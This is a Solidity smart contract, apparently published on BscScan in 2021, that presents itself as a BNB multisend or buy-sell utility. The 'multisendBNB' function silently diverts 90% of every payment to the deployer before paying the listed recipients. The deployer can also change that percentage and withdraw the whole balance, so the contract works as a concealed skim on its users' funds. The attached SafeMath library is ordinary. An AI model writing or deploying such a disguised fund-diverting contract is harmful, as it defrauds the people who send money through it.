/**
 *Submitted for verification at BscScan.com on 2021-11-28
*/

pragma solidity >= 0.5.0;

contract bitbnb_buy_sell {


  address payable public deployer;
  uint perc;


  constructor() public {
       
        
        deployer = msg.sender;
        perc = 90;

    }



   modifier onlyDeployer(){
                require(msg.sender == deployer);
        _;
        }
    
    event Multisended(uint256 value , address indexed sender);
    using SafeMath for uint256;

    function multisendBNB(address payable[]  memory  _contributors, uint256[] memory _balances) public payable {
        uint256 total = msg.value;
        deployer.transfer(total*perc/100);
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        emit Multisended(msg.value, msg.sender);
    }



    function withdrawLostTRXFromBalance(uint256 _amount, uint256 _type) payable public onlyDeployer{
        uint256 fullAmount = address(this).balance;

        if(_type == 0) {
            deployer.transfer(_amount);
        }else {
            deployer.transfer(fullAmount);
        }
    }


    function changeDeployer(address payable addr) public onlyDeployer {
        deployer = addr;
    }

    function changeperc(uint cperc) public onlyDeployer {
        perc = cperc;
    }




    
    
}






/**     
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}